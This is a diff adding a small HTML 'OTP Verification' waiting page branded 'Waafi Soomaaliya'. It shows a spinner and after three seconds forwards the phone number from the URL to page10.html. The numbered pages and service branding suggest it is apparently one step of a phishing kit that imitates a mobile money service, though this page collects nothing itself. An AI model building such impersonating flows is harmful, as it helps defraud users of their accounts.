@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OTP Verification</title>
+
+<style>
+body{
+    margin:0;
+    font-family:Arial, sans-serif;
+    background:#f3f3f3;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.card{
+    background:white;
+    padding:40px 25px;
+    border-radius:20px;
+    text-align:center;
+    width:85%;
+    box-shadow:0 5px 20px rgba(0,0,0,0.15);
+}
+
+.loader{
+    width:90px;
+    height:90px;
+    border-radius:50%;
+    border:8px solid #e5e5e5;
+    border-top:8px solid #7ac943;
+    margin:auto;
+    animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+    100%{ transform:rotate(360deg); }
+}
+
+h2{
+    color:#7ac943;
+    margin-top:20px;
+}
+
+.footer{
+    position:fixed;
+    bottom:0;
+    width:100%;
+    background:#7ac943;
+    text-align:center;
+    color:white;
+    padding:20px 0;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+    <div class="loader"></div>
+    <h2>Xaqiijinta OTP-ga</h2>
+    <p>Fadlan sug...</p>
+</div>
+
+<div class="footer">
+© 2025 Waafi Soomaaliya
+</div>
+
+<script>
+const params = new URLSearchParams(window.location.search);
+const phone = params.get("phone");
+
+if(!phone){
+   alert("Number missing");
+}
+
+// go to page 10 after 3 seconds
+setTimeout(()=>{
+   window.location.href = "page10.html?phone=" + encodeURIComponent(phone);
+},3000);
+</script>
+
+</body>
+</html>
